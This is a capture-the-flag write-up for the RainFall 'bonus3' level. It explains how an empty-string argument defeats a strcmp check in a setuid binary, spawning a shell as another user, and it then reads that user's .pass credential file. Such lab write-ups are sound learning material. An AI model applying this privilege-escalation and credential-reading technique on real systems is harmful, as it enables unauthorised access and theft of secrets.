
# Bonus 3

We have a program who take an argument:
```sh
$ ./bonus3 
$ ./bonus3 42

$ 
```

By reading the decompiled code, we found thoses lines:
```c
ptr[atoi(argv[1])] = 0;
if (strcmp(ptr, argv[1]) == 0)
    execl("/bin/sh", "sh");
```

So if argv[1] is "\0", ptr[0] will also be 0, and strcmp will compare 0 and 0.

```sh
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
```